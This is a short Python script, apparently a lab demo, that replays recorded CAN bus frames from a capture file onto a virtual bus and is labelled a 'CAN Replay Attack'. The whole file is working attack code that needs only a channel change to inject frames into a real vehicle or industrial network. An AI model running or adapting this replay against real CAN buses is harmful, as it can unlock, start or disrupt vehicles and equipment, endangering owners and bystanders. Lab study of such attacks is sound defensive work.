import can
import json
import time

bus = can.interface.Bus(channel='test', interface='virtual')

with open('capture.json', 'r') as f:
    recorded = json.load(f)

print(f"=== CAN Replay Attack ===")
print(f"Replaying {len(recorded)} captured frames...\n")

for frame in recorded:
    msg = can.Message(
        arbitration_id=frame['id'],
        data=frame['data'],
        is_extended_id=False
    )
    bus.send(msg)
    print(f"Replayed ID: {hex(frame['id'])} Data: {bytes(frame['data']).hex()}")
    time.sleep(0.1)

print("\nReplay complete.")
bus.shutdown()
